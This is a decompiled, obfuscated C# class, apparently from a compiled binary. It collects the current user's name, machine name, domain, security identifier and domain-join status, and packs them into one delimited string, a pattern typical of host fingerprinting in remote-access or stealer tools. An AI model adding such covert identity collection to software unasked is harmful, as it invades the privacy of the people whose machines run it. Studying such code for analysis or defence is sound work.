using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;

// Token: 0x020000EA RID: 234
internal class Class54
{
	// Token: 0x1700032B RID: 811
	// (get) Token: 0x06000771 RID: 1905 RVA: 0x00066E00 File Offset: 0x00065000
	// (set) Token: 0x06000772 RID: 1906 RVA: 0x00066E14 File Offset: 0x00065014
	public string String_0 { get; set; }

	// Token: 0x1700032C RID: 812
	// (get) Token: 0x06000773 RID: 1907 RVA: 0x00066E28 File Offset: 0x00065028
	// (set) Token: 0x06000774 RID: 1908 RVA: 0x00066E3C File Offset: 0x0006503C
	public string String_1 { get; set; }

	// Token: 0x1700032D RID: 813
	// (get) Token: 0x06000775 RID: 1909 RVA: 0x00066E50 File Offset: 0x00065050
	// (set) Token: 0x06000776 RID: 1910 RVA: 0x00066E64 File Offset: 0x00065064
	public string String_2 { get; set; }

	// Token: 0x1700032E RID: 814
	// (get) Token: 0x06000777 RID: 1911 RVA: 0x00066E78 File Offset: 0x00065078
	// (set) Token: 0x06000778 RID: 1912 RVA: 0x00066E8C File Offset: 0x0006508C
	public string String_3 { get; set; }

	// Token: 0x1700032F RID: 815
	// (get) Token: 0x06000779 RID: 1913 RVA: 0x00066EA0 File Offset: 0x000650A0
	// (set) Token: 0x0600077A RID: 1914 RVA: 0x00066EB4 File Offset: 0x000650B4
	public Class54.Class55.Enum13 Enum13_0 { get; set; }

	// Token: 0x0600077B RID: 1915 RVA: 0x00066EC8 File Offset: 0x000650C8
	public static Class54.Class55.Enum13 smethod_0()
	{
		Class54.Class55.Enum13 @enum = Class54.Class55.Enum13.const_0;
		IntPtr zero = IntPtr.Zero;
		Class54.Class55.NetGetJoinInformation(null, out zero, out @enum);
		if (zero != IntPtr.Zero)
		{
			Class54.Class55.NetApiBufferFree(zero);
		}
		return @enum;
	}

	// Token: 0x0600077C RID: 1916 RVA: 0x00066F00 File Offset: 0x00065100
	public Class54()
	{
		this.String_0 = Environment.UserName;
		this.String_1 = Environment.MachineName;
		this.String_2 = Environment.UserDomainName;
		this.String_3 = Class54.smethod_2();
		try
		{
			this.Enum13_0 = Class54.smethod_0();
		}
		catch
		{
			this.Enum13_0 = Class54.Class55.Enum13.const_0;
		}
	}

	// Token: 0x0600077D RID: 1917 RVA: 0x00066F68 File Offset: 0x00065168
	public virtual string ToString()
	{
		return string.Format("{0}{1}{2}{3}{4}{5}{6}{7}{8}", new object[]
		{
			Class15.smethod_22(this.String_0),
			Class15.char_2,
			Class15.smethod_22(this.String_1),
			Class15.char_2,
			Class15.smethod_22(this.String_2),
			Class15.char_2,
			Class15.smethod_22(this.String_3),
			Class15.char_2,
			(int)this.Enum13_0
		});
	}

	// Token: 0x0600077E RID: 1918 RVA: 0x00067000 File Offset: 0x00065200
	public static string smethod_1()
	{
		return new Class54().ToString();
	}

	// Token: 0x0600077F RID: 1919 RVA: 0x00067018 File Offset: 0x00065218
	public static string smethod_2()
	{
		string text;
		try
		{
			text = WindowsIdentity.GetCurrent().User.Value;
			if (text.Length == 0)
			{
				text = string.Empty;
			}
		}
		catch
		{
			text = string.Empty;
		}
		return text;
	}

	// Token: 0x04000A13 RID: 2579
	[CompilerGenerated]
	private string string_0;

	// Token: 0x04000A14 RID: 2580
	[CompilerGenerated]
	private string string_1;

	// Token: 0x04000A15 RID: 2581
	[CompilerGenerated]
	private string string_2;

	// Token: 0x04000A16 RID: 2582
	[CompilerGenerated]
	private string string_3;

	// Token: 0x04000A17 RID: 2583
	[CompilerGenerated]
	private Class54.Class55.Enum13 enum13_0;

	// Token: 0x020000EB RID: 235
	internal class Class55
	{
		// Token: 0x06000780 RID: 1920
		[DllImport("Netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern int NetGetJoinInformation(string string_0, out IntPtr intptr_0, out Class54.Class55.Enum13 enum13_0);

		// Token: 0x06000781 RID: 1921
		[DllImport("Netapi32.dll")]
		public static extern int NetApiBufferFree(IntPtr intptr_0);

		// Token: 0x04000A18 RID: 2584
		public const int int_0 = 0;

		// Token: 0x020000EC RID: 236
		public enum Enum13
		{
			// Token: 0x04000A1A RID: 2586
			const_0,
			// Token: 0x04000A1B RID: 2587
			const_1,
			// Token: 0x04000A1C RID: 2588
			const_2,
			// Token: 0x04000A1D RID: 2589
			const_3
		}
	}
}
